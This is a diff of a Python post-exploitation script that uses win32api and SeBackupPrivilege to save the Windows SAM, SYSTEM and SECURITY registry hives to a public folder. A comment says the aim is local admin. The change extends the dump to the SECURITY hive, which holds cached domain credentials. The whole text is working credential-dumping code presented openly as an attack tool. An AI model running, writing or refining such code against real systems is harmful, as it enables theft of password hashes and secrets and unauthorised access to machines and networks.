@@ -34,20 +34,24 @@ def SetBackupPrivilege():
 
 def dumpreg():
     #Sam File
-    samhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SAM", 0, win32con.KEY_ALL_ACCESS);
-    win32api.RegSaveKey(samhandle, "c:\\users\\public\\sam.save", None);
-    win32api.RegCloseKey(samhandle);
+    samhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SAM", 0, win32con.KEY_ALL_ACCESS)
+    win32api.RegSaveKey(samhandle, "c:\\users\\public\\sam.save", None)
+    win32api.RegCloseKey(samhandle)
     
     #System File
-    systemhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SYSTEM", 0, win32con.KEY_ALL_ACCESS);
-    win32api.RegSaveKey(systemhandle, "c:\\users\\public\\system.save", None);
-    win32api.RegCloseKey(systemhandle);
-    return True
+    systemhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SYSTEM", 0, win32con.KEY_ALL_ACCESS)
+    win32api.RegSaveKey(systemhandle, "c:\\users\\public\\system.save", None)
+    win32api.RegCloseKey(systemhandle)
+    
     
     #Security File (we dont have permissions to get this by default...but it's really only useful for domain creds and I just want local admin)
-    #securityhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SECURITY", 0, win32con.KEY_ALL_ACCESS);
-    #win32api.RegSaveKey(securityhandle, "c:\\users\\public\\security.save", None);
-    #win32api.RegCloseKey(securityhandle);
+    try:
+        securityhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SECURITY", 0, win32con.KEY_ALL_ACCESS)
+        win32api.RegSaveKey(securityhandle, "c:\\users\\public\\security.save", None)
+        win32api.RegCloseKey(securityhandle)
+    except:
+        print("you don't have permission to grab the SECURITY file...")
+    return True
 if not ElevatedorNot():
     print("[!] not elevated...\n")
     exit()
@@ -55,7 +59,7 @@ if not SetBackupPrivilege():
     print("[!] could not get seBackupPrivilege...\n")
     exit()
 if dumpreg():
-    print("[+] Successfully dumped SAM and SYSTEM!!!\n")
+    print("[+] Successfully dumped SAM, SYSTEM, and SECURITY files!!!\n")
     exit()
 else:
     print("[!] couldn't dump registry...\n")
